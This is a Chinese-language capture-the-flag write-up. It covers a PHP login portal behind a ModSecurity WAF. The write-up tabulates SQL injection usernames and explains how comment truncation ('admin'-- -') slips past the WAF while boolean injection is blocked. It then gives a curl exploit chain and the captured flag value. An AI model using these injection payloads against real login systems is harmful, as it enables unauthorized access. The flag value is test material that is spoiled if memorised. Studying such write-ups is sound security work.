## 题目原文

> 某企业内部门户在边界部署了 Web 防护设备，其后端登录业务仍存在可被利用的弱点。已获授权进行红队评估，设法穿透边界防护并获取仅管理员可见的受保护 flag。

## 题解

### 入口与指纹

入口是一个登录页，标题 `Login — Internal Portal`，`nginx/1.30.1`，后端是 PHP（响应带 `PHPSESSID`）。页面脚注写着 `Protected by ModSecurity WAF`。表单只有 `username` 和 `password`，POST 回当前路径。

### 关键观察

登录框后面是拼接 SQL 的口令校验，边界设备拦的是它认识的注入形状，不是注释截断。

同一组用户名在这一台上的结果：

| 用户名 | 结果 |
| --- | --- |
| `admin` | 200，`Invalid username or password` |
| `admin' or '1'='1` | 403，nginx 的 Forbidden 页，请求没有进登录逻辑 |
| `admin'--` | 403，同样被边界拦住 |
| `admin'#` | 200，口令校验失败。`#` 没有被后端当成注释 |
| `admin'-- -` | 302 到 `dashboard.php` |
| `admin'/**/-- -` | 302 到 `dashboard.php` |

`-- -` 和块注释都能把口令比较从语句里切掉，而 `or` 这种布尔注入会被 ModSecurity 直接 403。MySQL 的 `--` 注释要求后面有空白，所以单独的 `admin'--` 既可能撞规则，也不是一条合法注释；后面补一个 `-` 同时满足语法和规则缺口。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -c cj -b cj -D - -o /dev/null \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x" \
  "http://$T/"
curl -sS -b cj "http://$T/dashboard.php"
```

仪表盘标题是 `Dashboard — Internal Portal`，flag 在页面上的 flag 区域里，本次平台接受的值是 `flag{ce6fd8e4-c096-4b49-b787-f8b3e43cc86f}`。

### flag 位置

管理员登录后的 `dashboard.php`。flag 只在这个会话里渲染，未登录的请求看不到它。
